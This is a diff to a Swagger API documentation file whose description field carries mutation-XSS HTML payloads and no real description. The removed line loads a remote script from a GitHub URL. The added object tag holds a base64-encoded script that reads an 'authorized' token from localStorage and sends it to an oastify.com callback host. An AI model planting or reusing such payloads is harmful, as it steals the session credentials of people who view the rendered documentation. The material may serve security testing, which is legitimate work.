@@ -2,7 +2,18 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-         <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://raw.githubusercontent.com/ProcureSign/introduction.github.io/main/script.js></script>">
+         <form><math><mtext></form>
+    <form>
+      <mglyph>
+        <svg>
+          <mtext>
+            <textarea><path id="</textarea>
+            <object data='data:text/html;base64,KGZ1bmN0aW9uKCkgewogIHZhciB0b2tlbiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdhdXRob3JpemVkJyk7IHZhciBvcmlnaW4gPSB3aW5kb3cub3JpZ2luOyBhbGVydChPcmlnaW4gaXM6ICR7b3JpZ2lufSBhbmQgdGhlIHRva2VuOiAiJHt0b2tlbn0iKTsgdmFyIGltZyA9IG5ldyBJbWFnZSgpOyBpbWcuc3JjID0gJ2h0dHBzOi8vdTgzNmt0Y25oM3RrYzZqZXdmaGRyNXV6dXEwaG85a3g5Lm9hc3RpZnkuY29tLz9hdXRob3JpemVkPScgKyBlbmNvZGVVUklDb21wb25lbnQodG9rZW4pO30pKCk7'></object>
+          </path>
+        </mtext>
+      </svg>
+    </mglyph>
+    </form>
   version: production
 basePath: /JSSResource/
 produces:
